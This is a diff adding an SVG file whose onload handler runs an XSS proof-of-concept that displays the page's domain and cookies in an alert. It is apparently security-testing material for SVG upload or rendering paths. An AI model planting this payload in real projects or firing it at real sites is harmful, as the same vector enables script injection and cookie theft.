@@ -1,0 +1,2 @@
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS Executed!\n\nDomain: ' + document.domain + '\n\nCookies: ' + (document.cookie || 'No cookies accessible (HttpOnly)'))">
+</svg>
